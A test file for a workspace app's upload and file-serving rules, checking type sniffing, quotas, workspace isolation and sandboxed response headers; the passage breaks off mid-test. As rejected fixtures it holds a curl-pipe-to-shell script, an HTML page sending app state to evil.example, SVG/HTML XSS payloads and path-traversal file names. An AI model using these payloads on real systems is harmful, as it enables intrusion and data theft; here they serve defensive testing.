/**
 * Uploaded files: pictures for pages and files for email.
 *
 * Safety properties this file holds:
 *   - no cross-workspace reads: a file is served to its own workspace's members and to nobody else;
 *   - no real credential in logs or responses: the bucket's key is never written anywhere;
 *   - what is kept is what was announced: by size, by kind, and never a program, a script or a page.
 */
import { createHash } from 'node:crypto';
import { createServer, type IncomingMessage, type Server } from 'node:http';
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { MAX_FILE_BYTES } from '../../src/lib/files';
import { config } from '../src/config';
import { purgeDeletedWorkspaces } from '../src/db/purge';
import { forgetAbandonedUploads, removeWorkspaceFiles } from '../src/files/assets';
import { BucketError, BucketStore, authorization } from '../src/files/bucket';
import { bytesProblem, readDeclared } from '../src/files/rules';
import { fileStore, setFileStoreForTests, storeKind } from '../src/files/store';
import { FolderStore, MemoryStore } from '../src/testing/file-store';
import { recent } from '../src/lib/log';
import { blocksProblem } from '../src/state/ws-check';
import { Client, addMember, appPool, boot, jobs, newWorkspace, rows, samples, sendBytes, sysPool, uploadFile, withWorkspace } from './helpers';

let w: Client;
const memory = () => fileStore() as MemoryStore;
const announce = async (c: Client, body: Record<string, unknown>) => {
  const res = await c.post('/api/v1/uploads', body);
  return { status: res.status, body: (await res.json()) as { assetId?: string; error?: string; upload?: { url: string; method: string; headers: Record<string, string> } } };
};
const asset = async (id: string) => (await rows<{ id: string; workspace_id: string; purpose: string; content_type: string; size_bytes: number; storage_key: string; name: string | null; sha256: string | null; created_by: string; uploaded_at: Date | null }>('select * from asset where id = $1', [id]))[0];
const sha256 = (b: Uint8Array) => createHash('sha256').update(b).digest('hex');

beforeAll(async () => {
  await boot();
});
beforeEach(async () => {
  setFileStoreForTests(null);
  w = await newWorkspace('Files');
});

describe('announcing an upload', () => {
  it('records what is coming and says where to send it; the bytes then make it usable', async () => {
    const bytes = samples.png('a picture');
    const told = await announce(w, { purpose: 'page-image', type: 'image/png', size: bytes.length });
    expect(told.status).toBe(200);
    expect(told.body.upload).toEqual({ method: 'PUT', url: `/api/v1/uploads/${told.body.assetId}`, headers: { 'content-type': 'image/png' } });
    // Recorded, with a storage key that starts with the workspace's id, and not yet usable.
    const before = (await asset(told.body.assetId!))!;
    expect(before).toMatchObject({ workspace_id: w.workspaceId, purpose: 'page-image', content_type: 'image/png', size_bytes: bytes.length, created_by: w.userId, uploaded_at: null, sha256: null });
    expect(before.storage_key).toBe(`${w.workspaceId}/${before.id}`);
    expect((await w.get(`/api/v1/assets/${before.id}`)).status).toBe(404);

    const put = await sendBytes(w, 'PUT', told.body.upload!.url, bytes, { 'content-type': 'image/png' });
    expect(put.status).toBe(200);
    expect(await put.json()).toMatchObject({ assetId: before.id, ref: `asset:${before.id}`, type: 'image/png', size: bytes.length });
    const after = (await asset(before.id))!;
    expect(after.uploaded_at).not.toBeNull();
    expect(after.sha256).toBe(sha256(bytes));
    expect([...memory().files.keys()]).toContain(before.storage_key);
    // The answer never says where the file is kept.
    expect(JSON.stringify(told.body)).not.toContain(before.storage_key);
  });

  it('refuses what Timmy does not keep: SVG, programs, scripts, pages, archives, and anything over 10 MB', async () => {
    const refused = async (body: Record<string, unknown>, status: number, why: RegExp) => {
      const out = await announce(w, body);
      expect([JSON.stringify(body), out.status]).toEqual([JSON.stringify(body), status]);
      expect(out.body.error).toMatch(why);
    };
    // Pictures: the four kinds a screen may show, and never SVG.
    await refused({ purpose: 'page-image', type: 'image/svg+xml', size: 500 }, 415, /programs, scripts or web pages/);
    await refused({ purpose: 'page-cover', type: 'image/svg+xml', size: 500, name: 'logo.svg' }, 415, /programs, scripts or web pages/);
    await refused({ purpose: 'chat-icon', type: 'image/bmp', size: 500 }, 415, /PNG, JPEG, GIF or WebP/);
    await refused({ purpose: 'page-image', type: 'application/pdf', size: 500 }, 415, /PNG, JPEG, GIF or WebP/);
    await refused({ purpose: 'page-image', type: 'image/png', size: 500, name: 'photo.jpg' }, 415, /doesn’t match/);
    // Attachments: by type, and by the ending of the name, whichever gives it away.
    await refused({ purpose: 'attachment', type: 'application/x-msdownload', size: 500, name: 'setup.exe' }, 415, /programs, scripts or web pages/);
    await refused({ purpose: 'attachment', type: 'application/pdf', size: 500, name: 'invoice.pdf.exe' }, 415, /programs, scripts or web pages/);
    await refused({ purpose: 'attachment', type: 'application/octet-stream', size: 500, name: 'run.sh' }, 415, /programs, scripts or web pages/);
    await refused({ purpose: 'attachment', type: 'text/javascript', size: 500, name: 'notes.txt' }, 415, /programs, scripts or web pages/);
    await refused({ purpose: 'attachment', type: 'text/html', size: 500, name: 'page.html' }, 415, /programs, scripts or web pages/);
    await refused({ purpose: 'attachment', type: 'text/plain', size: 500, name: 'page.HTML' }, 415, /programs, scripts or web pages/);
    await refused({ purpose: 'attachment', type: 'application/vnd.ms-word.document.macroEnabled.12', size: 500, name: 'macro.docm' }, 415, /programs, scripts or web pages/);
    await refused({ purpose: 'attachment', type: 'application/zip', size: 500, name: 'bundle.zip' }, 415, /can’t be attached/);
    await refused({ purpose: 'attachment', type: 'application/pdf', size: 500, name: 'report.docx' }, 415, /doesn’t match/);
    await refused({ purpose: 'attachment', type: 'application/pdf', size: 500 }, 400, /needs its file name/);
    // A name that would show as something it is not, or point somewhere.
    await refused({ purpose: 'attachment', type: 'application/pdf', size: 500, name: 'invoice‮fdp.exe.pdf' }, 400, /characters Timmy can’t keep/);
    await refused({ purpose: 'attachment', type: 'application/pdf', size: 500, name: '../../etc/passwd.pdf' }, 400, /characters Timmy can’t keep/);
    await refused({ purpose: 'attachment', type: 'application/pdf', size: 500, name: `${'a'.repeat(300)}.pdf` }, 400, /too long/);
    // Size, and what it is for.
    await refused({ purpose: 'attachment', type: 'application/pdf', size: MAX_FILE_BYTES + 1, name: 'big.pdf' }, 413, /up to 10 MB/);
    await refused({ purpose: 'page-image', type: 'image/png', size: 0 }, 400, /how big/);
    await refused({ purpose: 'page-image', type: 'image/png', size: 12.5 }, 400, /how big/);
    await refused({ purpose: 'avatar', type: 'image/png', size: 500 }, 400, /what the file is for/);
    await refused({ type: 'image/png', size: 500 }, 400, /what the file is for/);
    expect(await rows('select 1 from asset where workspace_id = $1', [w.workspaceId])).toEqual([]);

    // What is kept: pictures for the three places, and common documents and pictures for email.
    for (const purpose of ['page-image', 'page-cover', 'chat-icon']) expect((await announce(w, { purpose, type: 'image/webp', size: 500 })).status).toBe(200);
    for (const [type, name] of [['application/pdf', 'Quote.PDF'], ['text/csv', 'leads.csv'], ['application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'Proposal v2.docx'], ['image/jpeg', 'site photo.jpeg']]) {
      expect([name, (await announce(w, { purpose: 'attachment', type, size: 500, name })).status]).toEqual([name, 200]);
    }
  });

  it('is for people who may change the workspace: a read-only role and someone signed out are refused', async () => {
    const png = { purpose: 'page-image', type: 'image/png', size: 100 };
    const revops = await addMember(w.workspaceId, 'revops');
    const client = await addMember(w.workspaceId, 'client');
    const assistant = await addMember(w.workspaceId, 'assistant');
    for (const c of [revops, client]) {
      const out = await announce(c, png);
      expect(out.status).toBe(403);
      expect(out.body.error).toMatch(/role can’t add files/);
    }
    expect((await announce(assistant, png)).status).toBe(200);
    expect((await announce(new Client(), png)).status).toBe(401);
    // A request from another site is refused before anything else.
    const cross = await (await boot()).request('/api/v1/uploads', { method: 'POST', headers: { origin: 'https://evil.example', cookie: [...w.cookies].map(([k, v]) => `${k}=${v}`).join('; '), 'content-type': 'application/json' }, body: JSON.stringify(png) });
    expect(cross.status).toBe(403);
  });

  it('a workspace has a ceiling on what it keeps, and on uploads announced and never sent', async () => {
    const kept = { quota: config.files.quotaBytes, pending: config.files.maxPendingUploads };
    try {
      config.files.quotaBytes = 1000;
      expect((await announce(w, { purpose: 'page-image', type: 'image/png', size: 600 })).status).toBe(200);
      const full = await announce(w, { purpose: 'page-image', type: 'image/png', size: 600 });
      expect(full.status).toBe(413);
      expect(full.body.error).toMatch(/used its/);
      // Another workspace has its own space.
      expect((await announce(await newWorkspace('Roomy'), { purpose: 'page-image', type: 'image/png', size: 600 })).status).toBe(200);
      config.files.quotaBytes = kept.quota;
      config.files.maxPendingUploads = 2;
      expect((await announce(w, { purpose: 'page-image', type: 'image/png', size: 10 })).status).toBe(200);
      const waiting = await announce(w, { purpose: 'page-image', type: 'image/png', size: 10 });
      expect(waiting.status).toBe(429);
    } finally {
      config.files.quotaBytes = kept.quota;
      config.files.maxPendingUploads = kept.pending;
    }
  });
});

describe('the bytes that arrive', () => {
  it('must be the size that was announced', async () => {
    const bytes = samples.png('exactly this');
    for (const size of [bytes.length - 1, bytes.length + 1]) {
      const told = await announce(w, { purpose: 'page-image', type: 'image/png', size });
      const put = await sendBytes(w, 'PUT', told.body.upload!.url, bytes, { 'content-type': 'image/png' });
      expect(put.status).toBe(400);
      expect(((await put.json()) as { error: string }).error).toMatch(/isn’t the size that was announced/);
      expect((await asset(told.body.assetId!))!.uploaded_at).toBeNull();
    }
    expect(memory().files.size).toBe(0);
  });

  it('must be the kind that was announced: an SVG, a page or a program under another name is not kept', async () => {
    const svg = samples.text('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><script>alert(1)</script></svg>');
    const html = samples.text('<!doctype html><html><script>alert(document.cookie)</script></html>');
    const program = new Uint8Array([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00]);
    const elf = new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]);
    const script = samples.text('#!/bin/sh\ncurl https://evil.example | sh\n');
    const cases: [string, { purpose: string; type: string; bytes: Uint8Array; name?: string }][] = [
      ['an SVG announced as a PNG', { purpose: 'page-image', type: 'image/png', bytes: svg }],
      ['a page announced as a JPEG', { purpose: 'page-cover', type: 'image/jpeg', bytes: html }],
      ['a JPEG announced as a PNG', { purpose: 'chat-icon', type: 'image/png', bytes: samples.jpeg() }],
      ['a page announced as a PDF', { purpose: 'attachment', type: 'application/pdf', bytes: html, name: 'quote.pdf' }],
      ['a Windows program announced as text', { purpose: 'attachment', type: 'text/plain', bytes: program, name: 'notes.txt' }],
      ['a Linux program announced as a spreadsheet', { purpose: 'attachment', type: 'text/csv', bytes: elf, name: 'leads.csv' }],
      ['a shell script announced as text', { purpose: 'attachment', type: 'text/plain', bytes: script, name: 'readme.txt' }],
      ['a PDF announced as a Word file', { purpose: 'attachment', type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', bytes: samples.pdf(), name: 'offer.docx' }],
    ];
    for (const [what, f] of cases) {
      const out = await uploadFile(w, f);
      expect([what, out.status]).toEqual([what, 400]);
      expect(out.error).toMatch(/isn’t the kind that was announced|programs or scripts/);
      expect((await asset(out.assetId))!.uploaded_at).toBeNull();
      expect((await w.get(`/api/v1/assets/${out.assetId}`)).status).toBe(404);
    }
    expect(memory().files.size).toBe(0);
    // The type the browser sends with the bytes has to be the announced one too.
    const told = await announce(w, { purpose: 'page-image', type: 'image/png', size: samples.png().length });
    expect((await sendBytes(w, 'PUT', told.body.upload!.url, samples.png(), { 'content-type': 'image/svg+xml' })).status).toBe(415);
    // Plain text that happens to begin with the letters M and Z is still text.
    expect((await uploadFile(w, { purpose: 'attachment', type: 'text/csv', bytes: samples.text('MZN,price\n1,2\n'), name: 'meticais.csv' })).status).toBe(200);
  });

  it('more than a file may weigh is refused before it is read', async () => {
    const told = await announce(w, { purpose: 'attachment', type: 'application/pdf', size: MAX_FILE_BYTES, name: 'big.pdf' });
    const tooBig = new Uint8Array(MAX_FILE_BYTES + 1);
    tooBig.set(samples.pdf());
    const put = await sendBytes(w, 'PUT', told.body.upload!.url, tooBig, { 'content-type': 'application/pdf' });
    expect(put.status).toBe(413);
    // Every other request keeps the small limit: a file's worth of JSON is not accepted anywhere else.
    const big = await sendBytes(w, 'POST', '/api/v1/uploads', new Uint8Array(2 * 1024 * 1024), { 'content-type': 'application/json' });
    expect(big.status).toBe(413);
    // Exactly the limit is fine.
    const full = new Uint8Array(MAX_FILE_BYTES);
    full.set(samples.pdf());
    expect((await sendBytes(w, 'PUT', told.body.upload!.url, full, { 'content-type': 'application/pdf' })).status).toBe(200);
  });

  it('an asset takes its bytes once, from the person who announced it', async () => {
    const bytes = samples.png('first');
    const told = await announce(w, { purpose: 'page-image', type: 'image/png', size: bytes.length });
    const url = told.body.upload!.url;
    // Not a teammate, not another workspace, not a role that only reads, not someone signed out.
    const mate = await addMember(w.workspaceId, 'member');
    const other = await newWorkspace('Elsewhere');
    const revops = await addMember(w.workspaceId, 'revops');
    expect((await sendBytes(mate, 'PUT', url, bytes, { 'content-type': 'image/png' })).status).toBe(404);
    expect((await sendBytes(other, 'PUT', url, bytes, { 'content-type': 'image/png' })).status).toBe(404);
    expect((await sendBytes(revops, 'PUT', url, bytes, { 'content-type': 'image/png' })).status).toBe(403);
    expect((await sendBytes(new Client(), 'PUT', url, bytes, { 'content-type': 'image/png' })).status).toBe(401);
    expect(memory().files.size).toBe(0);

    expect((await sendBytes(w, 'PUT', url, bytes, { 'content-type': 'image/png' })).status).toBe(200);
    // A second upload cannot replace what is there, even with bytes of the same size and kind.
    const again = await sendBytes(w, 'PUT', url, samples.png('other'), { 'content-type': 'image/png' });
    expect(again.status).toBe(409);
    const key = (await asset(told.body.assetId!))!.storage_key;
    expect(sha256(memory().files.get(key)!)).toBe(sha256(bytes));
    // Two uploads arriving together: one is kept.
    const race = await announce(w, { purpose: 'page-image', type: 'image/png', size: bytes.length });
    const results = await Promise.all([samples.png('aaaaa'), samples.png('bbbbb'), samples.png('ccccc')].map((b) => sendBytes(w, 'PUT', race.body.upload!.url, b, { 'content-type': 'image/png' })));
    expect(results.map((r) => r.status).sort()).toEqual([200, 409, 409]);
    const won = (await asset(race.body.assetId!))!;
    expect(sha256(memory().files.get(won.storage_key)!)).toBe(won.sha256);
  });
});

describe('reading a file back', () => {
  it('its own workspace gets it; another workspace gets 404; signed out is 401; a role that may not read is refused', async () => {
    const bytes = samples.png('for these eyes only');
    const up = await uploadFile(w, { purpose: 'page-image', type: 'image/png', bytes });
    expect(up.status).toBe(200);
    const mine = await w.get(`/api/v1/assets/${up.assetId}`);
    expect(mine.status).toBe(200);
    expect(sha256(new Uint8Array(await mine.arrayBuffer()))).toBe(sha256(bytes));
    // Anyone in the workspace who may read it, whoever uploaded it.
    expect((await (await addMember(w.workspaceId, 'revops')).get(`/api/v1/assets/${up.assetId}`)).status).toBe(200);

    const other = await newWorkspace('Rival');
    const theirs = await other.get(`/api/v1/assets/${up.assetId}`);
    expect(theirs.status).toBe(404);
    expect(await theirs.text()).not.toContain('for these eyes only');
    // Exactly what an id that never existed gets, so nothing tells the two apart.
    const never = await other.get('/api/v1/assets/ast_doesnotexist0000000');
    expect([never.status, await never.json()]).toEqual([404, { error: 'Not found' }]);
    expect((await new Client().get(`/api/v1/assets/${up.assetId}`)).status).toBe(401);
    expect((await (await addMember(w.workspaceId, 'client')).get(`/api/v1/assets/${up.assetId}`)).status).toBe(403);
    expect((await w.get('/api/v1/assets/..%2F..%2Fetc%2Fpasswd')).status).toBe(404);

    // Membership is checked on every request: removed from the workspace, the same person with the same cookie gets nothing.
    const leaver = await addMember(w.workspaceId, 'member', 'Soon Gone');
    expect((await leaver.get(`/api/v1/assets/${up.assetId}`)).status).toBe(200);
    await rows('delete from auth.member where "userId" = $1 and "organizationId" = $2', [leaver.userId, w.workspaceId]);
    expect((await leaver.get(`/api/v1/assets/${up.assetId}`)).status).toBe(403);
  });

  it('is asked about again on every use, and costs nothing when unchanged', async () => {
    const up = await uploadFile(w, { purpose: 'page-cover', type: 'image/jpeg', bytes: samples.jpeg('cover') });
    const first = await w.get(`/api/v1/assets/${up.assetId}`);
    expect(first.headers.get('cache-control')).toBe('private, no-cache');
    const etag = first.headers.get('etag')!;
    // Saying "you already have it" needs nothing from the store.
    memory().get = async () => Promise.reject(new Error('the store was asked'));
    const again = await w.request('GET', `/api/v1/assets/${up.assetId}`, undefined, { 'if-none-match': etag });
    expect(again.status).toBe(304);
    expect(await again.text()).toBe('');
    // The unchanged answer is still only for members.
    expect((await (await newWorkspace('Nosy')).request('GET', `/api/v1/assets/${up.assetId}`, undefined, { 'if-none-match': etag })).status).toBe(404);
  });

  it('a file that holds a page or an SVG cannot run on Timmy’s origin, whatever a browser is asked to do with it', async () => {
    const page = samples.text('<!doctype html><html><body><script>fetch("/api/v1/state").then(r => r.text()).then(t => navigator.sendBeacon("https://evil.example", t))</script></body></html>');
    const svg = samples.text('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>');
    // Neither can be uploaded as what it is. Kept as plain text (which is what the bytes are), each is still inert.
    for (const [name, bytes] of [['page.txt', page], ['drawing.txt', svg]] as const) {
      const up = await uploadFile(w, { purpose: 'attachment', type: 'text/plain', bytes, name });
      expect(up.status).toBe(200);
      const res = await w.get(`/api/v1/assets/${up.assetId}`);
      expect(res.status).toBe(200);
      // Not a type a browser renders or runs, and it may not guess another.
      expect(res.headers.get('content-type')).toBe('application/octet-stream');
      expect(res.headers.get('x-content-type-options')).toBe('nosniff');
      // Opened by itself it is a download, never a page.
      expect(res.headers.get('content-disposition')).toMatch(new RegExp(`^attachment; filename="${name}"`));
      // And if something showed it anyway: no scripts, no forms, no origin, no framing.
      const csp = res.headers.get('content-security-policy')!;
      expect(csp).toContain("default-src 'none'");
      expect(csp).toMatch(/(^|; )sandbox(;|$)/);
      expect(csp).toContain("frame-ancestors 'none'");
      expect(res.headers.get('cross-origin-resource-policy')).toBe('same-origin');
    }
    // A picture is named as the picture it was checked to be, with the same protections around it.
    const pic = await uploadFile(w, { purpose: 'page-image', type: 'image/png', bytes: samples.png() });
    const res = await w.get(`/api/v1/assets/${pic.assetId}`);
    expect(res.headers.get('content-type')).toBe('image/png');
    expect(res.headers.get('x-content-type-options')).toBe('nosniff');
    expect(res.headers.get('content-disposition')).toMatch(/^attachment; /);
    expect(res.headers.get('content-security-policy')).toMatch(/sandbox/);
    // The refusals carry them too.
    const none = await w.get('/api/v1/assets/ast_missing');
    expect(none.headers.get('content-security-policy')).toMatch(/sandbox/);
    // A name can't break out of the header it is put in.
    const odd = await uploadFile(w, { purpose: 'attachment', type: 'application/pdf', bytes: samples.pdf(), name: 'Angebot "final"; x=1 – ü.pdf' });
    const header = (await w.get(`/api/v1/assets/${odd.assetId}`)).headers.get('content-disposition')!;
    expect(header).toBe(`attachment; filename="Angebot _final_; x=1 _ _.pdf"; filename*=UTF-8''${encodeURIComponent('Angebot _final_; x=1 – ü.pdf')}`);
  });
});

describe('what the rules say, on their own', () => {
  it('reads an announcement into what will be recorded', () => {
    expect(readDeclared({ purpose: 'attachment', type: 'Application/PDF; charset=binary', size: 10, name: '  Quote.pdf ' })).toEqual({ ok: true, declared: { purpose: 'attachment', type: 'application/pdf', size: 10, name: 'Quote.pdf' } });
    expect(readDeclared(null).ok).toBe(false);
    expect(readDeclared({ purpose: 'attachment', type: 'application/pdf', size: 10, name: '.pdf' }).ok).toBe(false);
    expect(readDeclared({ purpose: 'attachment', type: 'application/pdf', size: 10, name: 'pdf' }).ok).toBe(false);
    expect(readDeclared({ purpose: 'attachment', type: 'constructor', size: 10, name: 'a.pdf' }).ok).toBe(false);
  });

  it('knows how each kind of file begins', () => {
    const ok = (type: string, bytes: Uint8Array) => bytesProblem({ type, size: bytes.length }, bytes);
    const zip = new Uint8Array([0x50, 0x4b, 0x03, 0x04, 1, 2, 3]);
    const old = new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1, 0]);
    expect(ok('image/gif', samples.text('GIF89a....'))).toBeNull();
    expect(ok('image/webp', samples.text('RIFF\u0001\u0001\u0001\u0001WEBPVP8 '))).toBeNull();
    expect(ok('application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', zip)).toBeNull();
    expect(ok('application/vnd.oasis.opendocument.text', zip)).toBeNull();
    expect(ok('application/msword', old)).toBeNull();
    expect(ok('application/rtf', samples.text('{\\rtf1 hello}'))).toBeNull();
    expect(ok('text/markdown', samples.text('# Notes\n\n#!important is not a script line\n'))).toBeNull();
    // Two-byte text, as a spreadsheet's "Unicode text" export writes it.
    expect(ok('text/csv', new Uint8Array([0xff, 0xfe, 0x61, 0x00, 0x2c, 0x00]))).toBeNull();
    expect(ok('text/plain', zip)).toMatch(/isn’t the kind/);
    expect(ok('text/plain', new Uint8Array([0x61, 0x00, 0x62]))).toMatch(/isn’t the kind/);
    expect(ok('application/msword', zip)).toMatch(/isn’t the kind/);
    expect(ok('image/webp', samples.text('RIFF....WAVEfmt '))).toMatch(/isn’t the kind/);
    expect(ok('application/x-unknown', samples.pdf())).toMatch(/isn’t the kind/);
    expect(ok('application/pdf', new Uint8Array([0xca, 0xfe, 0xba, 0xbe, 0, 0, 0, 0x34]))).toMatch(/programs or scripts/);
  });

  it('a page’s picture reference counts only when the caller found it among the workspace’s own uploaded pictures', () => {
    const blocks = [{ id: 'b', type: 'image', src: 'asset:ast_1' }];
    expect(blocksProblem(blocks)).toMatch(/picture/);
    expect(blocksProblem(blocks, new Set(['ast_2']))).toMatch(/picture/);
    expect(blocksProblem(blocks, new Set(['ast_1']))).toBeNull();
    // Nothing shaped like a reference slips through as something else.
    for (const src of ['asset:', 'asset:../x', 'asset:ast_1/../../y', 'asset:ast_1?x', 'ASSET:ast_1', ' asset:ast_1']) expect([src, blocksProblem([{ id: 'b', type: 'image', src }], new Set(['ast_1', '']))]).toEqual([src, expect.stringMatching(/picture/)]);
  });
});

describe('pictures on pages and in settings', () => {
  const doc = (id: string, extra: Record<string, unknown>) => w.cmd({ type: 'ws', ops: [{ op: 'put', col: 'docs', item: { id, blocks: [], ...extra } }] });

  it('a page may show its own workspace’s uploaded picture, as a block and as a cover, and it is kept as a reference', async () => {
    const pic = await uploadFile(w, { purpose: 'page-image', type: 'image/png', bytes: samples.png('diagram') });
    const cover = await uploadFile(w, { purpose: 'page-cover', type: 'image/jpeg', bytes: samples.jpeg('skyline') });
    const saved = await doc('d1', { blocks: [{ id: 'b1', type: 'image', src: `asset:${pic.assetId}`, width: 400 }], cover: { kind: 'image', value: `asset:${cover.assetId}`, y: 30 } });
    expect(saved.ok).toBe(true);
    const d = (await w.state()).ws.docs.d1 as unknown as { blocks: { src: string }[]; cover: { value: string } };
    expect(d.blocks[0]!.src).toBe(`asset:${pic.assetId}`);
    expect(d.cover.value).toBe(`asset:${cover.assetId}`);
    // What is stored for the page is the reference, not the picture.
    const stored = await rows<{ data: unknown }>(`select data from state_doc where workspace_id = $1 and slice = 'ws.docs' and id = 'd1'`, [w.workspaceId]);
    expect(JSON.stringify(stored[0]!.data)).not.toMatch(/data:image|base64/);
    // A later change to something else on the page is judged with the picture still in place, and accepted.
    expect((await w.cmd({ type: 'ws', ops: [{ op: 'patch', col: 'docs', id: 'd1', patch: { icon: '📌' } }] })).ok).toBe(true);
    // Older pages keep their inline pictures and their web addresses.
    expect((await doc('d2', { blocks: [{ id: 'b1', type: 'image', src: `data:image/png;base64,${'A'.repeat(200)}` }, { id: 'b2', type: 'image', src: 'https://example.test/a.png' }] })).ok).toBe(true);
  });

  it('a page may not show another workspace’s picture, one whose bytes never arrived, or a file that is not a picture', async () => {
    const other = await newWorkspace('Neighbour');
    const theirs = await uploadFile(other, { purpose: 'page-image', type: 'image/png', bytes: samples.png('theirs') });
    const pending = await announce(w, { purpose: 'page-image', type: 'image/png', size: 100 });
    const pdf = await uploadFile(w, { purpose: 'attachment', type: 'application/pdf', bytes: samples.pdf(), name: 'quote.pdf' });
    for (const [what, id] of [['another workspace’s', theirs.assetId], ['never uploaded', pending.body.assetId!], ['not a picture', pdf.assetId], ['made up', 'ast_madeup000000000000']] as const) {
      const block = await doc('bad', { blocks: [{ id: 'b', type: 'image', src: `asset:${id}` }] });
      expect([what, block.ok]).toEqual([what, false]);
      expect(block.error).toMatch(/picture on that page/);
      const cover = await doc('bad', { cover: { kind: 'image', value: `asset:${id}` } });
      expect([what, cover.ok]).toEqual([what, false]);
      expect(cover.error).toMatch(/cover picture/);
      const icon = await w.cmd({ type: 'ws', ops: [{ op: 'patch', col: 'chat', id: 'site', patch: { icon: `asset:${id}` } }] });
      expect([what, icon.ok]).toEqual([what, false]);
    }
    expect((await w.state()).ws.docs.bad).toBeUndefined();
    // Slipped in with an edit to a page that is otherwise fine, it is refused the same way.
    await doc('fine', { blocks: [{ id: 'b', type: 'p', text: 'hello' }] });
    expect((await w.cmd({ type: 'ws', ops: [{ op: 'patch', col: 'docs', id: 'fine', patch: { blocks: [{ id: 'b', type: 'image', src: `asset:${theirs.assetId}` }] } }] })).ok).toBe(false);
    // The other workspace can use its own picture, and still can after all that.
    expect((await other.cmd({ type: 'ws', ops: [{ op: 'put', col: 'docs', item: { id: 'ok', blocks: [{ id: 'b', type: 'image', src: `asset:${theirs.assetId}` }] } }] })).ok).toBe(true);
  });

  it('“Summarize with Timmy” reads a page with an uploaded picture on it, and holds what is on screen to the same rule', async () => {
    const pic = await uploadFile(w, { purpose: 'page-image', type: 'image/png', bytes: samples.png('chart') });
    const theirs = await uploadFile(await newWorkspace('Next door'), { purpose: 'page-image', type: 'image/png', bytes: samples.png('theirs') });
    const blocks = [{ id: 'h', type: 'h1', text: 'Launch plan' }, { id: 'i', type: 'image', src: `asset:${pic.assetId}` }, { id: 'p', type: 'p', text: 'We ship in July.' }];
    expect((await w.cmd({ type: 'ws', ops: [{ op: 'put', col: 'files', item: { id: 'plan', name: 'Launch plan', kind: 'doc' } }, { op: 'put', col: 'docs', item: { id: 'plan', blocks } }] })).ok).toBe(true);
    expect((await w.post('/api/v1/pages/plan/summarize', { blocks })).status).toBe(200);
    const borrowed = await w.post('/api/v1/pages/plan/summarize', { blocks: [...blocks, { id: 'x', type: 'image', src: `asset:${theirs.assetId}` }] });
    expect(borrowed.status).toBe(400);
    expect(((await borrowed.json()) as { error: string }).error).toMatch(/picture on that page/);
  });

  it('an earlier version of a page that held an uploaded picture and cover can be put back, references and all', async () => {
    const pic = await uploadFile(w, { purpose: 'page-image', type: 'image/png', bytes: samples.png('floor plan') });
    const cover = await uploadFile(w, { purpose: 'page-cover', type: 'image/jpeg', bytes: samples.jpeg('street') });
    const blocks = [{ id: 'h', type: 'h1', text: 'Site visit' }, { id: 'i', type: 'image', src: `asset:${pic.assetId}` }];
    const file = { id: 'visit', name: 'Site visit', kind: 'doc', folder: '', updated: new Date(), owner: 'me' };
    expect((await w.cmd({ type: 'ws', ops: [{ op: 'put', col: 'files', item: file }, { op: 'put', col: 'docs', item: { id: 'visit', blocks, cover: { kind: 'image', value: `asset:${cover.assetId}` } } }] })).ok).toBe(true);
    // The picture and the cover are taken off; what the page held before is kept as version 1.
    expect((await w.cmd({ type: 'ws', ops: [{ op: 'patch', col: 'docs', id: 'visit', patch: { blocks: [blocks[0]], cover: null } }] })).ok).toBe(true);
    const kept = await rows<{ blocks: unknown; cover: unknown }>(`select blocks, cover from doc_revision where workspace_id = $1 and file_id = 'visit' and version = 1`, [w.workspaceId]);
    expect(JSON.stringify(kept[0])).toContain(`asset:${pic.assetId}`);
    const res = await w.post('/api/v1/pages/visit/versions/1/restore');
    expect([res.status, await res.text()]).toEqual([200, expect.stringContaining('"ok":true')]);
    const back = (await w.state()).ws.docs.visit as unknown as { blocks: { src?: string }[]; cover?: { value: string } };
    expect(back.blocks.map((b) => b.src).filter(Boolean)).toEqual([`asset:${pic.assetId}`]);
    expect(back.cover?.value).toBe(`asset:${cover.assetId}`);
  });

  it('the website chat’s picture stays inline: it is shown to visitors, and an upload is never handed to anyone outside the workspace', async () => {
    const set = (value: string) => w.cmd({ type: 'ws', ops: [{ op: 'patch', col: 'chat', id: 'site', patch: { icon: value } }] });
    // A small picture carried inline, as before, is kept, and is what visitors would be shown.
    const inline = `data:image/png;base64,${'A'.repeat(120)}`;
    expect((await set(inline)).ok).toBe(true);
    expect(((await w.state()).ws.chat.site as { icon?: string }).icon).toBe(inline);
    // No upload can stand in for it, whatever it was uploaded for: the assets route serves members only, so a
    // reference here would show visitors nothing, and naming a page's picture here must never make it public.
    for (const purpose of ['chat-icon', 'page-image'] as const) {
      const up = await uploadFile(w, { purpose, type: 'image/png', bytes: samples.png(`face for ${purpose}`) });
      const tried = await set(`asset:${up.assetId}`);
      expect([purpose, tried.ok]).toEqual([purpose, false]);
      expect(tried.error).toMatch(/chat’s picture/);
    }
    expect(((await w.state()).ws.chat.site as { icon?: string }).icon).toBe(inline);
    expect((await set('https://example.test/face.png')).ok).toBe(false);
    expect((await set('data:image/svg+xml;base64,PHN2Zz4=')).ok).toBe(false);
  });
});

describe('when a workspace goes, its files go', () => {
  it('deleting a workspace removes its files from the store and their records, and leaves everyone else’s', async () => {
    const other = await newWorkspace('Stays');
    const kept = await uploadFile(other, { purpose: 'page-image', type: 'image/png', bytes: samples.png('stays') });
    const a = await uploadFile(w, { purpose: 'page-image', type: 'image/png', bytes: samples.png('goes') });
    const b = await uploadFile(w, { purpose: 'attachment', type: 'application/pdf', bytes: samples.pdf(), name: 'goes.pdf' });
    expect((await memory().list(`${w.workspaceId}/`)).sort()).toEqual([`${w.workspaceId}/${a.assetId}`, `${w.workspaceId}/${b.assetId}`].sort());
    // Asked for a workspace nobody deleted, the removal does nothing.
    expect(await removeWorkspaceFiles(w.workspaceId)).toBe(0);
    expect(await memory().list(`${w.workspaceId}/`)).toHaveLength(2);

    expect((await w.post('/api/auth/organization/delete', { organizationId: w.workspaceId })).status).toBe(200);
    // Nobody can read them from that moment, before any job has run.
    expect((await w.get(`/api/v1/assets/${a.assetId}`)).status).not.toBe(200);
